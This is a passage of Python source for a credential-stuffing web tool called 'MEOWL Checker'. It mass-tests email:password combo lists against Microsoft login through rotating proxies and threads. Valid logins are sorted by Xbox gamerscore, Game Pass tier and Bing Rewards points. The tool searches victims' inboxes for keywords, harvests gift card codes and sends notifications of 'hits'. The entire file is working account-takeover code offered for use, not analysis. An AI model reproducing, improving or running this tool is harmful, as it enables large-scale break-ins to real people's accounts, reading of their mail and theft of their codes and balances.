                self._diag['reason'] = 'no_ppft'
                return {"status": "BAD"}
            sftag = sftag_match.group(1)

            url_post_match = re.search(r'"urlPost":"(.+?)"', resp.text)
            if not url_post_match:
                self._diag['reason'] = 'no_urlpost'
                return {"status": "BAD"}
            url_post = url_post_match.group(1)
            self._diag['ppft_found'] = True
            self._diag['urlpost_found'] = True

            login_req = session.post(url_post, data={'login': email, 'loginfmt': email,
                                                     'passwd': password, 'PPFT': sftag},
                                     timeout=15, verify=False)
            self._diag['login_final_url'] = (login_req.url or '')[:200]

            if "password is incorrect" in login_req.text.lower():
                self._diag['reason'] = 'wrong_password'; return {"status": "BAD"}
            if "account doesn't exist" in login_req.text.lower():
                self._diag['reason'] = 'no_account'; return {"status": "BAD"}
            if "recover?mkt" in login_req.text or "identity/confirm" in login_req.text:
                self._diag['reason'] = 'needs_verification'
                return {"status": "2FA", "email": email, "password": password}
            if "/Abuse?mkt=" in login_req.text:
                self._diag['reason'] = 'banned'; return {"status": "BANNED"}

            ms_token = None
            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            self._diag['token_found'] = bool(ms_token)
            if not ms_token:
                self._diag['reason'] = 'no_token'
                return {"status": "BAD"}

            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate',
                json={"Properties": {"AuthMethod": "RPS",
                                      "SiteName": "user.auth.xboxlive.com",
                                      "RpsTicket": ms_token},
                      "RelyingParty": "http://auth.xboxlive.com",
                      "TokenType": "JWT"}, timeout=15, verify=False)
            if xb_req.status_code != 200:
                self._diag['reason'] = f'xbl_auth_{xb_req.status_code}'
                return {"status": "BAD"}
            xb_data = xb_req.json()
            xb_token = xb_data.get('Token')
            uhs = xb_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            if not xb_token or not uhs:
                self._diag['reason'] = 'no_xbl_token'; return {"status": "BAD"}

            xsts_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                      "RelyingParty": "http://xboxlive.com",
                      "TokenType": "JWT"}, timeout=15, verify=False)

            gamerscore_int = 0
            games_list = []
            formatted_games = ""
            gamertag = ""
            xuid = ""
            country = "Unknown"
            payment_method = "None"
            renewal_date = "N/A"

            if xsts_req.status_code == 200:
                xsts_token = xsts_req.json().get('Token')
                prof_req = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore,Gamertag",
                    headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                             "x-xbl-contract-version": "2"}, timeout=15, verify=False)
                if prof_req.status_code == 200:
                    for setting in prof_req.json().get('profileUsers', [{}])[0].get('settings', []):
                        if setting.get('id') == 'Gamerscore':
                            gamerscore_int = int(setting.get('value', 0))
                        elif setting.get('id') == 'Gamertag':
                            gamertag = setting.get('value', '')
                formatted_games, games_list = self.get_formatted_games(session, uhs, xsts_token)

            self._diag['gamerscore'] = gamerscore_int
            if gamerscore_int < 5:
                self._diag['reason'] = f'low_gamerscore_{gamerscore_int}'
                return {"status": "BAD"}

            gamepass_status = "none"
            gamepass_type = "none"
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                      "RelyingParty": "rp://api.minecraftservices.com/",
                      "TokenType": "JWT"}, timeout=15, verify=False)
            if xsts_mc_req.status_code == 200:
                mc_token = xsts_mc_req.json().get('Token')
                mc_auth = session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json={'identityToken': f"XBL3.0 x={uhs};{mc_token}"}, timeout=15, verify=False)
                if mc_auth.status_code == 200:
                    access_token = mc_auth.json().get('access_token')
                    ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                          headers={'Authorization': f"Bearer {access_token}"},
                                          timeout=15, verify=False)
                    ent_t = ent_req.text.lower()
                    if 'product_game_pass_ultimate' in ent_t:
                        gamepass_status, gamepass_type = "ULTIMATE", "GamePass Ultimate"
                    elif 'product_game_pass_pc' in ent_t:
                        gamepass_status, gamepass_type = "PC", "GamePass PC"
                    elif 'product_game_pass_extra' in ent_t:
                        gamepass_status, gamepass_type = "EXTRA", "GamePass Extra"
                    elif 'product_game_pass_premium' in ent_t:
                        gamepass_status, gamepass_type = "PREMIUM", "GamePass Premium"
                    elif 'product_game_pass_core' in ent_t:
                        gamepass_status, gamepass_type = "CORE", "GamePass Core"
                    elif 'product_game_pass' in ent_t:
                        gamepass_status, gamepass_type = "STANDARD", "GamePass Standard"

            result_data = {'email': email, 'password': password,
                           'gamerscore': gamerscore_int, 'gamertag': gamertag,
                           'gamepass': gamepass_status, 'gamepass_type': gamepass_type,
                           'games_list': formatted_games, 'games_data': games_list,
                           'country': country, 'xuid': xuid,
                           'payment_method': payment_method, 'renewal_date': renewal_date}

            if gamepass_status != "none":
                return {"status": "PREMIUM", "data": result_data}
            elif gamerscore_int >= 5000:
                result_data['premium_type'] = "High Gamerscore"
                return {"status": "PREMIUM", "data": result_data}
            else:
                return {"status": "FREE", "data": result_data}
        except requests.exceptions.Timeout:
            self._diag['reason'] = 'timeout'
            return {"status": "TIMEOUT"}
        except requests.exceptions.ProxyError:
            raise
        except Exception as e:
            self._diag['reason'] = str(e)[:120]
            return {"status": "ERROR"}

# ===== Rewards =====
class RewardsChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                                     "AppleWebKit/537.36"})
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self._diag = {}

    def check_account(self, email, password):
        try:
            s = self.session
            login_url = ("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1784850000"
                         "&rver=7.0.6730.0&wp=MBI_SSL&wreply=https%3A%2F%2Foutlook.live.com%2Fowa%2F"
                         "&id=292841&cbcxt=out&lw=1&fl=dob%7Cfname%7Clname&cobrandid=90015&uaid="
                         + str(uuid.uuid4()).replace("-", "")[:16])
            r1 = s.get(login_url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"}, timeout=REQUEST_TIMEOUT, verify=False)
            body1 = r1.text
            self._diag['page_len'] = len(body1 or '')

            m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', body1)
            if not m:
                self._diag['reason'] = 'no_urlpost'
                return "ERROR", "No urlPost"
            url_post = m.group(1).replace("\\/", "/")

            m = re.search(r'sFTTag":"<input[^>]+value=\\?"([^"\\]+)', body1)
            if not m:
                m = re.search(r'name="PPFT"\s+id="i0327"\s+value="([^"]+)"', body1)
            if not m:
                self._diag['reason'] = 'no_ppft'
                return "ERROR", "No PPFT"
            ppft = m.group(1)
            self._diag['ppft_found'] = True
            self._diag['urlpost_found'] = True

            login_data = (f"login={email}&loginfmt={email}&type=11&LoginOptions=1"
                          f"&passwd={password}&PPFT={ppft}&PPSX=PassportR&i19=9960")
            r2 = s.post(url_post, data=login_data, headers={
                "Host": "login.live.com", "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": r1.url,
                "Accept-Language": "en-US,en;q=0.9"},
                timeout=REQUEST_TIMEOUT, allow_redirects=True, verify=False)
            body2 = r2.text
            self._diag['login_final_url'] = (r2.url or '')[:200]

            cookie_names = list(s.cookies.keys())
            success = any(k in cookie_names for k in
                          ["JSH", "JSHP", "ANON", "WLSSC", "PPLState",
                           "__Host-MSAAUTHP", "MSAAUTHP"]) or "fntobu-y" in body2
            self._diag['success_cookie'] = success

            sErrTxt = ""
            m_err = re.search(r'"sErrTxt"\s*:\s*"([^"]*)"', body2)
            if m_err: sErrTxt = m_err.group(1)

            if not success:
                bl = body2.lower()
                if "too many times" in sErrTxt.lower() or "too many times" in bl:
                    self._diag['reason'] = 'rate_limited'; return "RATE_LIMIT", "Rate limited"
                if "incorrect" in sErrTxt.lower():
                    self._diag['reason'] = 'wrong_password'; return "BAD", "Wrong password"
                if "doesn" in sErrTxt.lower() and "exist" in sErrTxt.lower():
                    self._diag['reason'] = 'no_account'; return "BAD", "Account doesn't exist"
                if "verify" in sErrTxt.lower() or "confirm" in sErrTxt.lower():
                    self._diag['reason'] = 'needs_verify'; return "2FA", "Verification required"
                if "recover" in sErrTxt.lower():
                    self._diag['reason'] = 'needs_recover'; return "2FA", "Recovery required"
                if "locked" in sErrTxt.lower() or "blocked" in sErrTxt.lower():
                    self._diag['reason'] = 'locked'; return "2FA", "Account locked"
                if "https://account.live.com/identity/confirm" in body2:
                    self._diag['reason'] = 'identity_confirm'; return "2FA", "Identity confirm required"
                if "https://account.live.com/recover" in body2:
                    self._diag['reason'] = 'recover_url'; return "2FA", "Recovery required"
                if "https://account.live.com/Abuse" in body2:
                    self._diag['reason'] = 'banned'; return "2FA", "Account banned"
                self._diag['reason'] = 'login_failed'
                return "BAD", "Login failed"

            rewards_points = 0; rewards_level = ""; country_code = ""; display_name = ""
            is_rewards_member = False; lifetime_points = 0; redeemed_points = 0
            progress = ""; member_since = ""; program = ""; streak = 0
            try:
                r_signin = s.get("https://rewards.bing.com/signin", headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,*/*"}, timeout=REQUEST_TIMEOUT, allow_redirects=True, verify=False)
                m_form = re.search(r'<form[^>]+action="([^"]+)"[^>]*>(.*?)</form>', r_signin.text, re.S)
                if m_form:
                    action = m_form.group(1).replace("&amp;", "&")
                    inputs = re.findall(r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"', m_form.group(2))
                    if inputs:
                        s.post(action, data={k: v for k, v in inputs}, headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Accept": "text/html,*/*", "Referer": r_signin.url},
                            timeout=REQUEST_TIMEOUT, allow_redirects=True, verify=False)

                r_rewards = s.get("https://rewards.bing.com/api/getuserinfo?type=1", headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json, text/plain, */*",
                    "Referer": "https://rewards.bing.com/"}, timeout=REQUEST_TIMEOUT, verify=False)

                if r_rewards.status_code == 200:
                    try:
                        data = r_rewards.json()
                        dashboard = data.get("dashboard", {})
                        user_status = dashboard.get("userStatus", {})
                        level_info = user_status.get("levelInfo", {})
                        rewards_points   = int(user_status.get("availablePoints", 0) or 0)
                        lifetime_points  = user_status.get("lifetimePoints", 0) or 0
                        redeemed_points  = user_status.get("lifetimePointsRedeemed", 0) or 0
                        is_rewards_member = True
                        level_key = level_info.get("activeLevel", "") or ""
                        LEVEL_MAP = {"newLevel1": "Member", "newLevel2": "Silver", "newLevel3": "Gold"}
                        rewards_level = LEVEL_MAP.get(level_key, level_key)
                        pv = level_info.get("progress", 0) or 0
                        pm = level_info.get("progressMax", 0) or 0
                        progress = f"{pv}/{pm}" if pm else ""
                        country_code = (dashboard.get("country", "") or data.get("country", "")
                                        or user_status.get("country", ""))
                        attrs = dashboard.get("userProfile", {}).get("attributes", {}) or {}
                        if not country_code: country_code = attrs.get("country", "")
                        member_since = (attrs.get("created", "").split("T")[0]
                                        if attrs.get("created") else "")
                        program = attrs.get("program", "") or ""
                        streak_promo = dashboard.get("streakPromotion", {}) or {}
                        if streak_promo:
                            streak = int((streak_promo.get("attributes", {}) or {})
                                         .get("streakCounter", 0) or 0)
                        display_name = (user_status.get("friendlyName", "")
                                        or dashboard.get("userProfile", {}).get("friendlyName", ""))
                    except Exception:
                        rewards_points = 0; is_rewards_member = False
            except Exception:
                pass

            country_full = translate_country(country_code) if country_code else "Unknown"
            result = {'email': email, 'password': password, 'points': rewards_points,
                      'level': rewards_level, 'country': country_full,
                      'country_code': country_code, 'name': display_name,
                      'lifetime': lifetime_points, 'redeemed': redeemed_points,
                      'member': is_rewards_member, 'progress': progress,
                      'member_since': member_since, 'program': program, 'streak': streak}
            if is_rewards_member and rewards_points > 0: return "HIT", result
            elif is_rewards_member and rewards_points == 0: return "ZERO", result
            return "CUSTOM", result
        except requests.exceptions.Timeout:
            self._diag['reason'] = 'timeout'
            return "ERROR", {"error": "Timeout"}
        except requests.exceptions.ProxyError:
            raise
        except Exception as e:
            self._diag['reason'] = str(e)[:120]
            return "ERROR", {"error": str(e)[:100]}

# ===== Session =====
class CheckSession:
    def __init__(self, accounts, keywords, checker_type="hotmail",
                 filename="", proxies=None, threads=THREADS_DEFAULT):
        self.session_id = str(uuid.uuid4())[:8]
        self.accounts = deque(accounts)
        self.keywords = keywords
        self.checker_type = checker_type
        self.filename = filename
        self.proxy_pool = ProxyPool(proxies)
        self.threads = max(THREADS_MIN, min(THREADS_MAX, int(threads)))

        self.total = len(accounts)
        self.checked = self.valid = self.inbox = self.twofa = self.bad = 0
        self.errors = self.premium = self.free = self.banned = 0
        self.gamerscore_count = self.gamepass_count = 0
        self.rewards_points = self.rewards_hits = self.rewards_zero = 0
        self.rewards_custom = self.rewards_rate_limit = 0
        self.codes_found: List[Dict[str, str]] = []
        self.accounts_with_codes = 0
        self._seen_codes: Set[str] = set()
        
        self.proxy_depleted = False

        self.results = {'valid': [], 'twofa': [], 'banned': [], 'premium': [],
                        'free': [], 'games': [], 'rewards_hits': [], 'rewards_zero': [],
                        'rewards_custom': [], 'rewards_rate_limit': []}
        self.keyword_accounts: Dict[str, Set[str]] = {}
        self.keyword_details: Dict[str, List[str]] = {}

        self.running = True
        self.stopped = False
        self.completed = False
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        self.active = 0
        self.hits = deque(maxlen=HIT_FEED_SIZE)
        self.hits_lock = threading.Lock()

    def stop(self):
        with self.lock:
            self.running = False
            self.stopped = True

    def add_hit(self, category, text, color="green"):
        with self.hits_lock:
            self.hits.append({'time': datetime.now().strftime('%H:%M:%S'),
                              'category': category, 'text': text, 'color': color})
        if category not in ("BAD", "ERROR", "PROXY_DEAD"):
            send_notifications(category, text)

    def get_stats(self):
        with self.lock:
            elapsed = (datetime.now() - self.start_time).total_seconds()
            cpm = int(self.checked / elapsed * 60) if elapsed > 1 and self.checked > 10 else 0
            pct = (self.checked / self.total * 100) if self.total > 0 else 0
            p_stats = self.proxy_pool.stats()
            return {'total': self.total, 'checked': self.checked, 'valid': self.valid,
                    'inbox': self.inbox, 'twofa': self.twofa, 'bad': self.bad,
                    'errors': self.errors, 'premium': self.premium, 'free': self.free,
                    'banned': self.banned, 'gamerscore': self.gamerscore_count,
                    'gamepass': self.gamepass_count, 'rewards_points': self.rewards_points,
                    'rewards_hits': self.rewards_hits, 'rewards_zero': self.rewards_zero,
                    'rewards_custom': self.rewards_custom,
                    'rewards_rate_limit': self.rewards_rate_limit,
                    'codes_found': len(self.codes_found),
                    'accounts_with_codes': self.accounts_with_codes,
                    'cpm': cpm, 'elapsed': elapsed, 'percent': pct,
                    'running': self.running, 'stopped': self.stopped,
                    'completed': self.completed, 'active': self.active,
                    'checker_type': self.checker_type,
                    'proxied': len(self.proxy_pool.proxies) > 0,
                    'proxy_alive': p_stats['alive'],
                    'proxy_dead': p_stats['dead'],
                    'proxy_depleted': self.proxy_depleted,
                    'threads': self.threads}

    def get_hits(self, limit=80):
        with self.hits_lock:
            return list(self.hits)[-limit:]

# ===== Check functions =====
def check_hotmail_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    checker = MicrosoftInboxChecker(email, password, proxy=proxy,
                                    inbox_keywords=session.keywords, threads=session.threads)
    status = checker.login()
    
    if status == 'SUCCESS':
        with session.lock:
            session.valid += 1
            session.results['valid'].append(f"{email}:{password}")
        graph_token = checker.get_graph_token()
        country = 'Unknown'
        if graph_token and checker.get_profile_via_graph(graph_token):
            country = checker.country or 'Unknown'
        if not country or country == 'Unknown':
            if checker.get_profile_via_substrate():
                country = checker.country or 'Unknown'
        total_count, inbox_hits = checker.check_inbox()
        if inbox_hits:
            with session.lock:
                session.inbox += 1
                messages = checker.get_keyword_messages()
                flag = get_flag(country)
                for hit in inbox_hits:
                    parts = hit.split(': ')
                    if len(parts) == 2:
                        keyword = parts[0].replace('(body)', '').strip()
                        count = parts[1]
                        session.keyword_accounts.setdefault(keyword, set()).add(email)
                        hit_info = (f"{email}:{password} | {flag} Country = {country.upper()}"
                                    f" | Keyword = {keyword} ({count})")
                        if keyword in messages and messages[keyword]:
                            msg = messages[keyword][0]
                            hit_info += (f" | Last Message Date = {format_date(msg.get('date', ''))}"
                                         f" | Last Sender = {msg.get('sender', 'Unknown')}"
                                         f" | Subject = {msg.get('subject', 'No Subject')}"
                                         f" | Name = {checker.name or 'Unknown'}")
                        session.keyword_details.setdefault(keyword, []).append(hit_info)
                session.results['inbox'].append(
                    f"{email}:{password} | {country} | {total_count} Found | [{', '.join(inbox_hits)}]")
            session.add_hit("INBOX", f"{email} | {', '.join(inbox_hits)}", "gold")
    elif status == '2FA':
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    else:
        errs = str(checker._diag.get('errors', []))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        
        with session.lock:
            session.bad += 1
        reason = checker._diag.get('reason', '')
        if reason: session.add_hit("BAD", f"{email} ({reason})", "danger")

def check_xbox_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    chk = XboxChecker(proxy=proxy)
    result = chk.check_v2(email, password)
    status = result.get('status', 'BAD')
    data = result.get('data', {})
    
    if status == 'PREMIUM':
        with session.lock:
            session.premium += 1
            session.valid += 1
            gs = data.get('gamerscore', 0)
            session.gamerscore_count += gs
            if data.get('gamepass', 'none') != 'none':
                session.gamepass_count += 1
            games_data = data.get('games_data', [])
            game_str = ""
            if games_data:
                sorted_games = sorted(games_data, key=lambda x: x.get('score', 0), reverse=True)
                for i, g in enumerate(sorted_games[:30], 1):
                    tag = " 🔥[PREMIUM]" if g.get('premium') else ""
                    game_str += f"  {i}. {g['name']} - {g['score']}G{tag}\n"
                if len(sorted_games) > 30:
                    game_str += f"  ... and {len(sorted_games) - 30} more games\n"
            entry = f"{email}:{password} [Gscore: {gs}G]"
            if data.get('gamepass', 'none') != 'none':
                entry += f" [{data.get('gamepass_type')}]"
            entry += f"\nGames (highest to lowest score):\n{game_str or 'No games found'}"
            session.results['premium'].append(entry)
            if games_data:
                session.results['games'].append(
                    f"{email}:{password}\nGamerscore: {gs}G\n"
                    f"GamePass: {data.get('gamepass_type')}\nGames:\n{game_str}\n")
        session.add_hit("PREMIUM", f"{email} | {gs}G | {data.get('gamepass_type','-')}", "gold")
    elif status == 'FREE':
        with session.lock:
            session.free += 1
            session.valid += 1
            gs = data.get('gamerscore', 0)
            session.gamerscore_count += gs
            if data.get('gamepass', 'none') != 'none':
                session.gamepass_count += 1
            games_data = data.get('games_data', [])
            game_str = ""
            if games_data:
                sorted_games = sorted(games_data, key=lambda x: x.get('score', 0), reverse=True)
                for i, g in enumerate(sorted_games[:30], 1):
                    tag = " 🔥[PREMIUM]" if g.get('premium') else ""
                    game_str += f"  {i}. {g['name']} - {g['score']}G{tag}\n"
                if len(sorted_games) > 30:
                    game_str += f"  ... and {len(sorted_games) - 30} more games\n"
            session.results['free'].append(
                f"{email}:{password} [Gscore: {gs}G]\nGames (highest to lowest score):\n{game_str or 'No games found'}")
            if games_data:
                session.results['games'].append(
                    f"{email}:{password}\nGamerscore: {gs}G\nGames:\n{game_str}\n")
        session.add_hit("FREE", f"{email} | {gs}G", "cyan")
    elif status == '2FA':
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    elif status == 'BANNED':
        with session.lock:
            session.banned += 1
            session.results['banned'].append(f"{email}:{password}")
        session.add_hit("BANNED", email, "danger")
    else:
        errs = str(chk._diag.get('reason', ''))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
            
        with session.lock:
            session.bad += 1
        reason = chk._diag.get('reason', '')
        if reason: session.add_hit("BAD", f"{email} ({reason})", "danger")

def check_rewards_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    chk = RewardsChecker(proxy=proxy)
    status, result = chk.check_account(email, password)
    
    if status == "HIT":
        with session.lock:
            session.rewards_hits += 1
            session.valid += 1
            points = result.get('points', 0)
            session.rewards_points += points
            session.results['rewards_hits'].append(f"{email}:{password} - [{points}]")
        session.add_hit("REWARDS", f"{email} | {result.get('points',0)}pts", "gold")
    elif status == "ZERO":
        with session.lock:
            session.rewards_zero += 1
            session.valid += 1
            session.results['rewards_zero'].append(f"{email}:{password} - [0]")
        session.add_hit("ZERO", email, "warn")
    elif status == "CUSTOM":
        with session.lock:
            session.rewards_custom += 1
            session.valid += 1
            session.results['rewards_custom'].append(
                f"{email}:{password} | Custom: No Rewards | Country: {result.get('country', 'Unknown')}")
        session.add_hit("CUSTOM", email, "cyan")
    elif status == "RATE_LIMIT":
        with session.lock:
            session.rewards_rate_limit += 1
            session.errors += 1
            session.results['rewards_rate_limit'].append(f"{email}:{password}")
        session.add_hit("RATE_LIMIT", email, "danger")
    elif status == "2FA":
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    else:
        errs = str(chk._diag.get('reason', ''))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
            
        with session.lock:
            session.bad += 1
        reason = chk._diag.get('reason', '')
        if reason: session.add_hit("BAD", f"{email} ({reason})", "danger")

def check_codefetcher_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    diag = {}
    codes = _fetch_codes_for_account(email, password, proxy=proxy, diag=diag)
    
    if codes:
        with session.lock:
            session.valid += 1
            session.accounts_with_codes += 1
            session.results['valid'].append(f"{email}:{password}")
            for code in codes:
                if code in session._seen_codes: continue
                session._seen_codes.add(code)
                session.codes_found.append({
                    'code': code, 'email': email, 'password': password,
                    'info': "GIFTCARDS CODE",
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')})
        for c in codes:
            session.add_hit("CODE", f"{c} | {email}", "gold")
    else:
        errs = str(diag.get('exception', ''))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
            
        with session.lock:
            session.bad += 1
        reason = diag.get('reason', '') or ('no_token' if not diag.get('token_found') else 'no_codes')
        session.add_hit("BAD", f"{email} ({reason})", "danger")

def run_check_worker(session: CheckSession, combo: str, check_func):
    proxy = session.proxy_pool.get()
    
    if proxy == "ALL_DEAD":
        session.proxy_depleted = True
        with session.lock:
            session.active -= 1
        session.accounts.appendleft(combo)
        return

    try:
        check_func(session, combo, proxy)
    except Exception as e:
        if proxy and ("Max retries exceeded" in str(e) or "PROXY_DEAD" in str(e)):
            session.proxy_pool.mark_dead(proxy)
            session.add_hit("PROXY_DEAD", f"{proxy} [Switched]", "warn")
            session.accounts.appendleft(combo)
            with session.lock:
                session.active -= 1
            return
        else:
            with session.lock:
                session.errors += 1
            session.add_hit("ERROR", f"{combo[:40]} {str(e)[:40]}", "danger")
    
    with session.lock:
        session.checked += 1
        session.active -= 1

def run_checker(session_id: str):
    session = sessions.get(session_id)
    if not session: return

    with session.lock:
        session.running = True
        session.stopped = False
        session.completed = False
        session.proxy_depleted = False

    if session.checker_type == "hotmail":   fn = check_hotmail_account
    elif session.checker_type == "xbox":    fn = check_xbox_account
    elif session.checker_type == "codefetcher": fn = check_codefetcher_account
    else:                                    fn = check_rewards_account

    threads = []
    while session.accounts and session.running and not session.stopped:
        if session.proxy_depleted:
            time.sleep(1)
            continue

        while (len(threads) < session.threads and session.accounts
               and session.running and not session.stopped and not session.proxy_depleted):
            acct = session.accounts.popleft()
            with session.lock:
                session.active += 1
            t = threading.Thread(target=run_check_worker, args=(session, acct, fn), daemon=True)
            t.start()
            threads.append(t)
        threads = [t for t in threads if t.is_alive()]
        time.sleep(0.1)

    for t in threads:
        try: t.join(timeout=THREAD_JOIN_TIMEOUT)
        except Exception: pass

    with session.lock:
        session.running = False
        if not session.stopped:
            session.completed = True
        session.active = 0

# ===== Flask App =====
app = Flask(__name__)
sessions: Dict[str, CheckSession] = {}

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/manifest.json')
def manifest():
    return jsonify({
        "name": "MEOWL Checker",
        "short_name": "MEOWL",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#010814",
        "theme_color": "#00b4d8",
        "icons": [{
            "src": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
            "sizes": "192x192",
            "type": "image/png"
        }]
    })

@app.route('/api/settings', methods=['GET', 'POST'])
def api_settings():
    global SETTINGS
    if request.method == 'POST':
        body = request.get_json(force=True, silent=True) or {}
        SETTINGS.update(body)
        save_settings()
        return jsonify({'ok': True})
    return jsonify(SETTINGS)

@app.route('/api/validate', methods=['POST'])
def api_validate():
    body = request.get_json(force=True, silent=True) or {}
    proxies = body.get('proxies', [])
    if not proxies: return jsonify([])
    
    results = []
    def check_one(p):
        start_time = time.time()
        proxy_url = parse_proxy(p)
        if not proxy_url:
            return {'proxy': p, 'status': 'Invalid Format', 'time': 0, 'ip': ''}
        try:
            s = requests.Session()
            r = s.get('https://api.ipify.org?format=json', proxies={'http': proxy_url, 'https': proxy_url}, timeout=10)
            if r.status_code == 200:
                return {'proxy': p, 'status': 'Valid', 'time': round(time.time() - start_time, 2), 'ip': r.json().get('ip', '')}
            else:
                return {'proxy': p, 'status': f'HTTP {r.status_code}', 'time': round(time.time() - start_time, 2), 'ip': ''}
        except Exception:
            return {'proxy': p, 'status': 'Dead', 'time': round(time.time() - start_time, 2), 'ip': ''}
            
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(check_one, proxies))
        
    return jsonify(results)

@app.route('/api/start', methods=['POST'])
def api_start():
    try:
        body = request.get_json(force=True, silent=True) or {}
        raw = body.get('accounts', [])
        accounts = [a for a in (normalize_combo(l) for l in raw) if a]
        if not accounts:
            return jsonify({'error': 'no valid accounts'}), 400
        checker_type = body.get('checker_type', 'hotmail')
        keywords = body.get('keywords', []) or ['Xbox']
        proxies = [p for p in (parse_proxy(x) for x in (body.get('proxies') or [])) if p]
        filename = body.get('filename', 'meowl_run')
        threads = int(body.get('threads', THREADS_DEFAULT))
        session = CheckSession(accounts, keywords, checker_type, filename, proxies, threads)
        sessions[session.session_id] = session
        threading.Thread(target=run_checker, args=(session.session_id,), daemon=True).start()
        return jsonify({'session_id': session.session_id, 'total': session.total,
                        'proxied': len(session.proxy_pool.proxies) > 0, 'threads': session.threads})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/proxy_switch', methods=['POST'])
def api_proxy_switch():
    body = request.get_json(force=True, silent=True) or {}
    sid = body.get('session_id')
    s = sessions.get(sid)
    if s:
        s.proxy_pool.proxyless_mode = True
        s.proxy_depleted = False
        return jsonify({'ok': True})
    return jsonify({'error': 'session not found'}), 404

@app.route('/api/resume/<sid>', methods=['POST'])
def api_resume(sid):
    s = sessions.get(sid)
    if not s: return jsonify({'error': 'no session'}), 404
    if s.running: return jsonify({'error': 'already running'}), 400
    if s.completed: return jsonify({'error': 'already completed'}), 400
    threading.Thread(target=run_checker, args=(sid,), daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/status/<sid>')
def api_status(sid):
    s = sessions.get(sid)
    if not s: return jsonify({'error': 'no session'}), 404
    return jsonify(s.get_stats())

@app.route('/api/hits/<sid>')
def api_hits(sid):
    s = sessions.get(sid)
    if not s: return jsonify([])
    return jsonify(s.get_hits())

@app.route('/api/stop/<sid>', methods=['POST'])
def api_stop(sid):
    s = sessions.get(sid)
    if not s: return jsonify({'error': 'no session'}), 404
    s.stop()
    return jsonify({'ok': True})

@app.route('/api/test', methods=['POST'])
def api_test():
    body = request.get_json(force=True, silent=True) or {}
    combo = (body.get('combo') or '').strip()
    checker_type = body.get('checker_type', 'hotmail')
    proxies = [p for p in (parse_proxy(x) for x in (body.get('proxies') or [])) if p]
    proxy = proxies[0] if proxies else None
    if ':' not in combo:
        return jsonify({'error': 'combo must be email:password'}), 400
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    out = {'email': email, 'checker_type': checker_type, 'proxied': bool(proxy)}
    try:
        if checker_type == 'xbox':
            chk = XboxChecker(proxy=proxy)
            r = chk.check_v2(email, password)
            out['status'] = r.get('status')
            out['diag'] = chk._diag
            if r.get('data'):
                out['gamerscore'] = r['data'].get('gamerscore')
